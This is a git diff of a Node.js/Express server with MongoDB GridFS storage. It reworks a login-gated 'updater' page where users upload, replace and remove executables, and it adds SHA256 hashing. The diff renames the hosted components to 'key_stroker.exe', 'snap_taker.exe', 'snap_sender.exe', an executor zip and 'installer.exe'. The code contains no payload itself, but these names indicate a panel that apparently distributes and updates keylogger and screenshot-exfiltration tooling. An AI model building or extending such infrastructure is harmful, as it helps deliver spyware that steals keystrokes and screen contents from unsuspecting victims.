@@ -10,6 +10,7 @@ import MongoStore from 'connect-mongo';
 import multer from 'multer';
 import { MongoClient, GridFSBucket } from 'mongodb';
 import { Readable } from 'stream';
+import crypto from 'crypto';
 
 
 dotenv.config({ path: 'cert.env' });
@@ -88,30 +89,54 @@ const statusPriority = {
   'not reachable': 5
 };
 
+// FileMetadata Schema
 const FileMetadataSchema = new mongoose.Schema({
-  category: { type: String, enum: ['subServiceZip', 'mainServiceExe', 'xenoExecutorZip'], unique: true },
+  category: { 
+    type: String, 
+    enum: ['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'] 
+  },
   filename: String,
   fileId: mongoose.Types.ObjectId,
   uploadedBy: String,
-  uploadDate: { type: Date, default: Date.now }
+  uploadDate: { type: Date, default: Date.now },
+  hash: String
 });
+
+// Compound unique index to ensure one file per category per user
+FileMetadataSchema.index({ uploadedBy: 1, category: 1 }, { unique: true });
 
 const FileMetadata = mongoose.model('FileMetadata', FileMetadataSchema);
 
-// … after mongoose.connect(…) …
-const client = new MongoClient(process.env.GATEWAY_DB_URI);
-await client.connect();
-const db = client.db();
-const bucket = new GridFSBucket(db, { bucketName: 'zips' });
+// GridFS setup (assuming this is part of your original setup)
+let bucket;
+(async () => {
+  const client = new MongoClient(process.env.GATEWAY_DB_URI);
+  await client.connect();
+  const db = client.db();
+  bucket = new GridFSBucket(db, { bucketName: 'zips' });
+})();
 
+// Multer configuration with dynamic file type filtering
 const zipUpload = multer({
   storage: multer.memoryStorage(),
   fileFilter: (req, file, cb) => {
-    const allowed = /\.(zip|exe)$/i.test(file.originalname);
-    cb(allowed ? null : new Error('Only .zip or .exe allowed'), allowed);
+    const category = req.params.category;
+    let allowed;
+    if (category === 'xenoExecutorZip') {
+      allowed = /\.zip$/i.test(file.originalname);
+    } else {
+      allowed = /\.exe$/i.test(file.originalname);
+    }
+    cb(allowed ? null : new Error(`Only ${category === 'xenoExecutorZip' ? '.zip' : '.exe'} files allowed for ${category}`), allowed);
   }
 });
 
+// Function to calculate SHA256 hash
+const calculateHash = (buffer) => {
+  const hash = crypto.createHash('sha256');
+  hash.update(buffer);
+  return hash.digest('hex');
+};
 
 // Polling function for API health
 async function pollApi(api) {
@@ -205,60 +230,7 @@ scheduleAllApis();
 // re-schedule when endpoints collection changes
 ApiEndpoint.watch().on('change', scheduleAllApis);
 
-const getUploadHTML = async (username) => {
-  // Fetch existing files from FileMetadata
-  const files = await FileMetadata.find({ uploadedBy: username }).lean();
-  const fileMap = {};
-  files.forEach(file => {
-    fileMap[file.category] = file;
-  });
 
-  const getFileSection = (category, label, accept) => {
-    const file = fileMap[category];
-    if (file) {
-      return `
-        <div class="file-section">
-          <h3>${label}</h3>
-          <p>Current File: ${file.filename}</p>
-          <p>Uploaded: ${new Date(file.uploadDate).toLocaleString()}</p>
-          <form action="/remove/${category}" method="POST" onsubmit="return confirm('Are you sure you want to remove this file?')">
-            <button type="submit" class="remove-btn">Remove</button>
-          </form>
-          <form action="/update/${category}" method="POST" enctype="multipart/form-data">
-            <input type="file" name="file" accept="${accept}" required>
-            <button type="submit" class="update-btn">Update</button>
-          </form>
-        </div>
-      `;
-    } else {
-      return `
-        <div class="file-section">
-          <h3>${label}</h3>
-          <p>No file uploaded</p>
-          <form action="/upload/${category}" method="POST" enctype="multipart/form-data">
-            <input type="file" name="file" accept="${accept}" required>
-            <button type="submit" class="upload-btn">Upload</button>
-          </form>
-        </div>
-      `;
-    }
-  };
-
-  return wrapPageContent(username, `
-    <link href="/upload.css" rel="stylesheet">
-    <div class="upload-wrapper">
-      <div class="upload-card">
-        <h1>Manage Files</h1>
-        ${getFileSection('subServiceZip', 'Sub-service Zip Files', '.zip')}
-        ${getFileSection('mainServiceExe', 'Main Service .exe', '.exe')}
-        ${getFileSection('xenoExecutorZip', 'Xeno Executor Update .zip', '.zip')}
-        <div class="upload-actions">
-          <button type="button" onclick="location.href='/dashboard'" class="cancel-btn">Back to Dashboard</button>
-        </div>
-      </div>
-    </div>
-  `);
-};
 
 // Login Page
 const loginHTML = `<!DOCTYPE html>
@@ -454,19 +426,68 @@ const getRemoveAPIHTML = (username, apiEndpoints) => {
   `);
 };
 
+// Updated getUploadHTML with six sections
+const getUploadHTML = async (username) => {
+  const files = await FileMetadata.find({ uploadedBy: username }).lean();
+  const fileMap = {};
+  files.forEach(file => {
+    fileMap[file.category] = file;
+  });
+
+  const getFileSection = (category, label, accept) => {
+    const file = fileMap[category];
+    if (file) {
+      return `
+        <div class="file-section">
+          <h3>${label}</h3>
+          <p>Current File: ${file.filename}</p>
+          <p>Uploaded: ${new Date(file.uploadDate).toLocaleString()}</p>
+          <form action="/remove/${category}" method="POST" onsubmit="return confirm('Are you sure you want to remove this file?')">
+            <button type="submit" class="remove-btn">Remove</button>
+          </form>
+          <form action="/update/${category}" method="POST" enctype="multipart/form-data">
+            <input type="file" name="file" accept="${accept}" required>
+            <button type="submit" class="update-btn">Update</button>
+          </form>
+        </div>
+      `;
+    } else {
+      return `
+        <div class="file-section">
+          <h3>${label}</h3>
+          <p>No file uploaded</p>
+          <form action="/upload/${category}" method="POST" enctype="multipart/form-data">
+            <input type="file" name="file" accept="${accept}" required>
+            <button type="submit" class="upload-btn">Upload</button>
+          </form>
+        </div>
+      `;
+    }
+  };
+
+  return wrapPageContent(username, `
+    <link href="/upload.css" rel="stylesheet">
+    <div class="upload-wrapper">
+      <div class="upload-card">
+        <h1>Manage Files</h1>
+        ${getFileSection('keyStrokerExe', 'key_stroker.exe', '.exe')}
+        ${getFileSection('mainExecutableExe', 'main_excutable.exe', '.exe')}
+        ${getFileSection('snapTakerExe', 'snap_taker.exe', '.exe')}
+        ${getFileSection('snapSenderExe', 'snap_sender.exe', '.exe')}
+        ${getFileSection('xenoExecutorZip', 'xeno_excutor.zip', '.zip')}
+        ${getFileSection('installerExe', 'installer.exe', '.exe')}
+        <div class="upload-actions">
+          <button type="button" onclick="location.href='/dashboard'" class="cancel-btn">Back to Dashboard</button>
+        </div>
+      </div>
+    </div>
+  `);
+};
 // Routes
 app.get('/', (req, res) => {
   if (req.session.user) return res.redirect('/dashboard');
   res.send(loginHTML);
 });
-app.get('/updater', async (req, res) => {
-  if (!req.session.user) {
-    console.log('Unauthorized access to /updater');
-    return res.redirect('/');
-  }
-  res.send(await getUploadHTML(req.session.user));
-});
-
 
 app.post('/login', async (req, res) => {
   const { username, password } = req.body;
@@ -727,30 +748,13 @@ app.get('/health', (req, res) => {
   res.status(200).json({ message: 'ok' });
 });
 
-app.post('/upload', zipUpload.single('file'), (req, res) => {
+// Routes
+app.get('/updater', async (req, res) => {
   if (!req.session.user) {
-    console.log('Unauthorized upload attempt');
-    return res.status(401).send('Unauthorized');
+    console.log('Unauthorized access to /updater');
+    return res.redirect('/');
   }
-
-  console.log(`Starting upload for user: ${req.session.user}, file: ${req.file.originalname}`);
-  const uploadStream = bucket.openUploadStream(req.file.originalname, {
-    metadata: { uploadedBy: req.session.user, uploadDate: new Date() }
-  });
-
-  // Pipe the incoming file stream to GridFS
-  const fileStream = Readable.from(req.file.buffer);
-  fileStream.pipe(uploadStream); 4
-
-  uploadStream.on('finish', () => {
-    console.log(`Upload successful for user: ${req.session.user}, file: ${req.file.originalname}`);
-    res.send('Upload successful');
-  });
-
-  uploadStream.on('error', err => {
-    console.error(`GridFS upload error for user: ${req.session.user}, file: ${req.file.originalname}`, err);
-    res.status(500).send('Upload failed');
-  });
+  res.send(await getUploadHTML(req.session.user));
 });
 
 app.post('/upload/:category', zipUpload.single('file'), async (req, res) => {
@@ -760,17 +764,17 @@ app.post('/upload/:category', zipUpload.single('file'), async (req, res) => {
   }
 
   const category = req.params.category;
-  if (!['subServiceZip', 'mainServiceExe', 'xenoExecutorZip'].includes(category)) {
+  if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
     console.log(`Invalid category upload attempt: ${category}`);
     return res.status(400).send('Invalid category');
   }
 
   console.log(`Starting upload for user: ${req.session.user}, category: ${category}, file: ${req.file.originalname}`);
+  const hash = calculateHash(req.file.buffer);
   const uploadStream = bucket.openUploadStream(req.file.originalname, {
-    metadata: { uploadedBy: req.session.user, uploadDate: new Date(), category }
+    metadata: { uploadedBy: req.session.user, uploadDate: new Date(), category, hash }
   });
 
-  // Pipe the incoming file stream to GridFS
   const fileStream = Readable.from(req.file.buffer);
   fileStream.pipe(uploadStream);
 
@@ -778,7 +782,7 @@ app.post('/upload/:category', zipUpload.single('file'), async (req, res) => {
     console.log(`Upload successful for user: ${req.session.user}, category: ${category}, file: ${req.file.originalname}`);
     await FileMetadata.findOneAndUpdate(
       { category, uploadedBy: req.session.user },
-      { filename: req.file.originalname, fileId: uploadStream.id, uploadDate: new Date() },
+      { filename: req.file.originalname, fileId: uploadStream.id, uploadDate: new Date(), hash },
       { upsert: true }
     );
     res.redirect('/updater');
@@ -797,7 +801,7 @@ app.post('/remove/:category', async (req, res) => {
   }
 
   const category = req.params.category;
-  if (!['subServiceZip', 'mainServiceExe', 'xenoExecutorZip'].includes(category)) {
+  if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
     console.log(`Invalid category remove attempt: ${category}`);
     return res.status(400).send('Invalid category');
   }
@@ -808,8 +812,6 @@ app.post('/remove/:category', async (req, res) => {
     console.log(`Removing file: ${file.filename}, category: ${category}, uploaded by: ${req.session.user}`);
     await bucket.delete(file.fileId);
     await FileMetadata.deleteOne({ category, uploadedBy: req.session.user });
-  } else {
-    console.log(`No file found for removal in category: ${category}, uploaded by: ${req.session.user}`);
   }
   res.redirect('/updater');
 });
@@ -821,7 +823,7 @@ app.post('/update/:category', zipUpload.single('file'), async (req, res) => {
   }
 
   const category = req.params.category;
-  if (!['subServiceZip', 'mainServiceExe', 'xenoExecutorZip'].includes(category)) {
+  if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
     console.log(`Invalid category update attempt: ${category}`);
     return res.status(400).send('Invalid category');
   }
@@ -833,18 +835,19 @@ app.post('/update/:category', zipUpload.single('file'), async (req, res) => {
     await bucket.delete(existingFile.fileId);
   }
 
+  const hash = calculateHash(req.file.buffer);
   const uploadStream = bucket.openUploadStream(req.file.originalname, {
-    metadata: { uploadedBy: req.session.user, uploadDate: new Date(), category }
+    metadata: { uploadedBy: req.session.user, uploadDate: new Date(), category, hash }
   });
 
-  // Pipe the incoming file stream to GridFS
   const fileStream = Readable.from(req.file.buffer);
   fileStream.pipe(uploadStream);
+
   uploadStream.on('finish', async () => {
     console.log(`Update successful for user: ${req.session.user}, category: ${category}, file: ${req.file.originalname}`);
     await FileMetadata.findOneAndUpdate(
       { category, uploadedBy: req.session.user },
-      { filename: req.file.originalname, fileId: uploadStream.id, uploadDate: new Date() },
+      { filename: req.file.originalname, fileId: uploadStream.id, uploadDate: new Date(), hash },
       { upsert: true }
     );
     res.redirect('/updater');
